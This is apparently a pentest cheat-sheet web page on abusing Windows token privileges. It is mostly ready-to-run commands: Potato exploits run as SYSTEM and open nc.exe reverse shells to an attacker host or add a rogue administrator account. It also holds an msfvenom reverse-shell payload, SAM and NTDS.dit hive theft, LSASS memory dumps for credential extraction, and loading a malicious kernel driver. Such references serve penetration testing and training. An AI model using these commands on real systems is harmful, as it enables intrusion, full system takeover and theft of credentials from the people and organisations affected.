title: Windows PrivEsc — Token Privilege Abuse
html:
Windows PrivEsc — Token Privilege Abuse

Windows token privileges define what a process or user is allowed to do. Service accounts (IIS, MSSQL, etc.) commonly hold SeImpersonatePrivilege, enabling instant SYSTEM escalation via Potato exploits.

Check Privileges

whoami /priv
whoami /all
Privilege Common Context Exploit Path
SeImpersonatePrivilege IIS, MSSQL, service accounts Potato exploits → SYSTEM
SeAssignPrimaryTokenPrivilege Service accounts Potato exploits → SYSTEM
SeBackupPrivilege Backup operators Read SAM/SYSTEM/NTDS.dit
SeRestorePrivilege Backup operators Write arbitrary files
SeDebugPrivilege Developers LSASS dump, process injection
SeTakeOwnershipPrivilege Administrators Take ownership of any file
SeLoadDriverPrivilege Print operators Load malicious kernel driver
SeCreateSymbolicLinkPrivilege Various Symlink to privileged paths

SeImpersonatePrivilege

The golden ticket. If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is Enabled, use a Potato exploit to impersonate SYSTEM.

GodPotato

REM Works on Windows Server 2012 - 2022, Windows 8 - 11
REM Download: https://github.com/BeichenDream/GodPotato

REM Execute command as SYSTEM
GodPotato.exe -cmd "cmd /c whoami"

REM Reverse shell
GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe <lhost> <lport> -e cmd.exe"

REM Add admin user
GodPotato.exe -cmd "cmd /c net user hacker <password> /add && net localgroup administrators hacker /add"

REM PowerShell reverse shell
GodPotato.exe -cmd "powershell -e <base64_payload>"

PrintSpoofer

REM Works on Windows 10, Server 2016/2019
REM Download: https://github.com/itm4n/PrintSpoofer

PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "cmd /c whoami"
PrintSpoofer.exe -c "C:\Temp\nc.exe <lhost> <lport> -e cmd.exe"

RoguePotato

REM Requires listener on attacker port 135
REM On attacker: socat tcp-listen:135,reuseaddr,fork tcp:<ip>:9999

RoguePotato.exe -r <lhost> -e "cmd /c C:\Temp\nc.exe <lhost> <lport> -e cmd.exe" -l 9999

SweetPotato

REM Combines JuicyPotato + PrintSpoofer + EfsRpc techniques
REM Download: https://github.com/CCob/SweetPotato

SweetPotato.exe -a "whoami"
SweetPotato.exe -p C:\Temp\nc.exe -a "<lhost> <lport> -e cmd.exe"

JuicyPotato (Windows Server 2016 and older)

REM Download: https://github.com/ohpe/juicy-potato
REM Requires specific CLSID for the OS version
REM CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID

JuicyPotato.exe -l <lport> -c "{CLSID}" -p C:\Temp\nc.exe -a "<lhost> <lport> -e cmd.exe" -t *

REM Create reverse shell payload with msfvenom
REM msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe

SeBackupPrivilege

Members of Backup Operators or accounts with SeBackupPrivilege can read any file regardless of permissions (backup semantics).

# Confirm privilege is Enabled
whoami /priv | findstr SeBackupPrivilege

# If Disabled but Listed, enable via PowerShell:
Import-Module .\EnableSeBackupPrivilege.ps1
Set-SeBackupPrivilege

# Copy SAM and SYSTEM hives (local)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Extract hashes on attacker
# impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Dump NTDS.dit from Domain Controller
# Requires shadow copy or diskshadow
diskshadow.exe /s C:\Temp\diskshadow.txt
# diskshadow.txt contents:
# set context persistent nowriters
# add volume c: alias cdrive
# create
# expose %cdrive% z:

# Copy NTDS.dit and SYSTEM from shadow copy
robocopy /b z:\Windows\NTDS\ C:\Temp\ ntds.dit
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Extract on attacker
# impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

SeDebugPrivilege

SeDebugPrivilege allows opening any process, including LSASS, for reading or injection.

# Dump LSASS with Task Manager (GUI)
# Task Manager → Details → lsass.exe → right-click → Create dump file

# ProcDump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# comsvcs.dll MiniDump (built-in, no extra binary)
tasklist | findstr lsass
# Note the PID
runas /user:Administrator "powershell -c (New-Object System.Runtime.InteropServices.MarshalAsAttribute)"
powershell -c "$id = (Get-Process lsass).Id; C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $id C:\Temp\lsass.dmp full"

# Parse dump on attacker with mimikatz or pypykatz
# pypykatz lsa minidump lsass.dmp
# sekurlsa::minidump lsass.dmp → sekurlsa::logonPasswords

# Process injection via PowerSploit
# Invoke-ReflectivePEInjection or similar

SeTakeOwnershipPrivilege

REM Take ownership of any file
takeown /f C:\Windows\System32\target.exe

REM Grant yourself full access
icacls C:\Windows\System32\target.exe /grant <username>:F

REM Example: take ownership of SAM
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant <username>:F
copy C:\Windows\System32\config\SAM C:\Temp\SAM

SeLoadDriverPrivilege

# Load a malicious kernel driver
# Create registry key pointing to driver
reg add "HKCU\System\CurrentControlSet\MyDriver" /v ImagePath /t REG_SZ /d "\??\C:\Temp\evil.sys"
reg add "HKCU\System\CurrentControlSet\MyDriver" /v Type /t REG_DWORD /d 1

# Use eoploaddriver.exe to load
eoploaddriver.exe System\CurrentControlSet\MyDriver C:\Temp\evil.sys

# Capcom.sys exploit chain is well-documented for this privilege

Quick Privilege Analysis

# PowerShell — list all enabled privileges
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups

# Check if running as SYSTEM
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Check if member of Administrators
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Token impersonation check with accesschk
accesschk.exe /accepteula -a * 2>nul | findstr /i priv
excerpt: Abuse Windows token privileges for privilege escalation — SeImpersonatePrivilege with GodPotato/PrintSpoofer, SeBackupPrivilege for NTDS.dit, SeDebugPrivilege for LSASS dump.
